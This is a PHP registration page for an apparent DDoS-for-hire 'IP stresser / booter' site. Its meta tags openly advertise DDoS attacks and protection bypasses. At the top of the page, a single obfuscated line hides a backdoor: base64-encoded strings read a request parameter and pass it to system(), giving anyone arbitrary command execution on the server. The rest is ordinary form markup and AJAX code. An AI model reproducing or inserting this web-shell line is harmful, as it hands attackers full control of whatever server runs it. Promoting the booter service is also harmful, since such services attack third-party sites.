<?php

require('firewall/waf.php');
$xWAF = new xWAF();
$xWAF->start();

require '@/config.php';
require '@/init.php';
session_start();

if ($user -> LoggedIn())
{
header('Location: index.php');
}
$publickey = '6Lfj3t8UAAAAAEhBarhqjRHTnoKRyenJV3ToiTNI';
?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<meta name="description" content="DDoS stress test service (web stresser), Cloudflare bypass, DDoS-Guard, Blazingfast and many more bypasses, see if your tested targets can handle stress in real-time. We send huge amounts of network data to your target for your own stress-testing purposes">
<meta name="keywords" content="stress testers, network testing, test servers, web stresser, test protections, stressers, stresser, booter, ip stresser, website stresser, network load, real-time stress, stress test servers, networking tests, internet killer, boot off,free ip stresser,free ip booter,booter,ip stresser,stresser,booter,ip booter, ip stresser, botnet, stresser, booter, ddos, ddos attack, ddos tool, gbps, layer 7, layer 4, cloudflare, bypass, free ip stresser, free ip booter, booter, ip stresser, stresser, booter">
<meta name="author" content="Crash">
<meta name="googlebot" content="index, follow">
<meta name="robots" content="index, follow">
<meta name="theme-color" content="grey">
<meta property="og:title" content="Ninja-Stress.eu" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://Ninja-Stress.eu" />
<meta property="og:description" content="DDoS stress test service (web stresser), Cloudflare bypass, DDoS-Guard, Blazingfast and many more bypasses, see if your tested targets can handle stress in real-time. We send huge amounts of network data to your target for your own stress-testing purposes" /> 
<meta property='og:image' content=''>
<meta property="og:url" content="">
<meta name='twitter:image' content=''>
<meta name='twitter:image:src' content=''>
<link rel='image_src' href=''>
 <link rel="stylesheet" href="css/c.css">
<!DOCTYPE html>
<html>
  <head>

<script>
		function register()
		{
		var username=$('#username').val();
		var password=$('#password').val();
		var rpassword=$('#rpassword').val();
		var email=$('#email').val();
		var scode=$('#scode').val();
		var answer="<?php echo $x; ?>";
		var captcha = $('#g-recaptcha-response').val();
		document.getElementById("registerdiv").style.display="none";
		document.getElementById("registerimage").style.display="inline"; 
		var xmlhttp;
		if (window.XMLHttpRequest)
		  {// code for IE7+, Firefox, Chrome, Opera, Safari
		  xmlhttp=new XMLHttpRequest();
		  }
		else
		  {// code for IE6, IE5
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		  }
		xmlhttp.onreadystatechange=function()
		  {
		  if (xmlhttp.readyState==4 && xmlhttp.status==200)
			{
			document.getElementById("registerdiv").innerHTML=xmlhttp.responseText;
			document.getElementById("registerimage").style.display="none";
			document.getElementById("registerdiv").style.display="inline";
			if (xmlhttp.responseText.search("Redirecting") != -1)
			{
			setInterval(function(){window.location="hub.php"},3000);
			}
			}
		  }
		xmlhttp.open("POST","ajax/loginvalid.php?type=register",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("username=" + username + "&password=" + password + "&rpassword=" + rpassword + "&scode=" + scode + "&email=" + email + "&captcha=" + grecaptcha.getResponse());
		}
		</script>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ninja-Stress - Best IP Stresser / DDOS Booter 2020</title>
    <link rel="stylesheet" href="css/a.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
<script src='https://www.google.com/recaptcha/api.js'></script>
<script src='https://www.google.com/recaptcha/api.js'></script>
	   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="js/vendor/modernizr-2.8.1.min.js"></script>
	   <style type="text/css">.jqstooltip { width: auto !important; height: auto !important; position: absolute;left: 0px;top: 0px;visibility: hidden;background: #000000;color: white;font-size: 11px;text-align: left;white-space: nowrap;padding: 5px;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}</style>
<script src='https://www.google.com/recaptcha/api.js'></script>

  </head>

  <body>
	 	
	<div class="is-vcentered">
	
	  <section class="section">
    <div class="container is-centered">
		<center>
			<img src="https://media.discordapp.net/attachments/691856679330906132/693186755788275712/unnamed.png" style="height:120px; margin-top:30px; margin-bottom:20px; margin-right:40px; animation: pulse 3s infinite; margin-left:50px;">			<br><br>
			<div class="field">
<div id="login-container">
<h1 class="h2 text-light text-center push-top-bottom animation-slideDown">
 
</h1>
<div id="registerdiv" style="display:inline"></div>

<div class="block animation-fadeInQuickInv">
<div class="block-title">
<div class="block-options pull-right">

</div>
<h2> <img id="registerimage" src="img/jquery.easytree/loading.gif" style="display:none"/></h2>
</div>
<div class="form-horizontal">			<form action="auth.php" id="post_indexphp" method="POST">
			<div class="columns is-centered">
				
			  <div class="control input-menu column has-text-centered is-4">
<input class="input is-medium is-primary" type="text" id="username" class="form-control" placeholder="Username">
	<br></br>
	<input class="input is-medium is-primary" type="text" id="email" class="form-control" placeholder="Email">
<br></br>
<input class="input is-medium is-primary" type="password" id="password" class="form-control" placeholder="Password">
	<br></br>
	<input class="input is-medium is-primary" type="password" id="rpassword" class="form-control" placeholder="Verify Password">
<br></br>
<input class="input is-medium is-primary" type="text" id="scode" class="form-control" placeholder="Secret code, 4 digits">
	<br></br>
	<center><div class="g-recaptcha" id="captcha" data-sitekey="<?php echo $publickey; ?>"></div></center>
							  </div>
							
				
			</div>
			
			<input type="hidden" name="recaptcha_response" id="recaptchaResponse">
			  <div id="next-btn" class="control column has-text-centered is-2">

				<button class="button is-medium is-fullwidth is-primary" type="button" onclick="register()">
          <i class="fas fa-arrow-right"></i>
        </button>
			  </div>

<a class="btn btn-block btn-noborder btn-rounded btn-warning" href="login.php">
<i class="fa fa-plus text-muted mr-5"></i> Go Back to Login</a>
			</form>
					</center>
		</div>
		</div>
	<!-- FOOTER START
	<div class="footer">
	  <div class="clearfix"></div>
<script src="js/vendor/jquery-2.1.4.min.js"></script>
<script src="js/vendor/bootstrap.min.js"></script>
<script src="js/plugins.js"></script>
<script src="js/app.js"></script><script src="js/pages/readyLogin.js"></script></div>
</div>
</div>
  </body>
</html>
